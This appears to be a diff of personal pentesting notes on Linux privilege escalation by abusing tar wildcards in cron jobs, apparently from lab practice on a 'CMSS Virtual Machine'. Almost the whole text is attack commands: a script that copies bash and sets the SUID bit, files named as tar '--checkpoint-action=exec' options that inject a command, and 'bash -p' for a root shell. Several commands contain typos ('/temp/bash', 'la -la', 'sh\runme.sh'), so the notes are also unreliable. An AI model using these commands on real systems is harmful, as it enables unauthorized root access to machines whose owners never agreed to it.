@@ -1,7 +1,20 @@
 Escalation via Cron Wildcards:
 
-echo 'cp /bin/bash /temp/bash; chmod +s /tmp/bash' >> /usr/local/bin/WantedFileName.sh
+if we find in the Crown table files with *:
 
-la -la /tmp 
+echo 'cp /bin/bash /temp/bash; chmod +s /tmp/bash' > runme.sh
 
+chmod +x runme.sh
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=sh\runme.sh
+
+CMSS Virtual Machine:
+touch /home/andre/--checkpoint-action=exec=sh\shell.sh
 tmp/bash -p
+
+
+
+#echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/WantedFileName.sh
+#la -la /tmp 
+
+
